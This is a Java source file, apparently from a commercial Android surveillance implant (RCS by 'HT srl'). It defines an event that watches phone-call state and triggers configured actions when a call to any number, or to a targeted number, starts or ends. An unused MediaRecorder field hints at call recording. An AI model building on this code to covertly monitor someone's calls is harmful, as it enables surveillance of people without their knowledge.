/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.event;

import android.media.MediaRecorder;

import com.android.dvci.Call;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfEvent;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerCall;
import com.android.dvci.util.Check;

public class EventCall extends BaseEvent implements Observer<Call> {
	/** The Constant TAG. */
	private static final String TAG = "EventCall"; //$NON-NLS-1$

	private int actionOnExit, actionOnEnter;
	private String number;
	private boolean inCall = false;
	private MediaRecorder recorder = null;
	
	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
		onExit(); // di sicurezza
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			if (conf.has("number") == true)
				number = conf.getString("number");
			else
				number = "";

			if (Cfg.DEBUG) {
				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	public int notification(Call c) {
		// Nel range
		if (c.isOngoing() && inCall == false) {
			// Match any number
			if (number.length() == 0) {
				inCall = true;
				
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
				}
				
				onEnter();

				return 0;
			}

			// Match a specific number
			if (c.getNumber().contains(number)) {
				inCall = true;
				
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
				}
				
				onEnter();

				return 0;
			}

			return 0;
		}

		if (c.isOngoing() == false && inCall == true) {
			inCall = false;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): triggering endCall"); //$NON-NLS-1$
			}
			
			onExit();
			return 0;
		}

		return 0;
	}
}
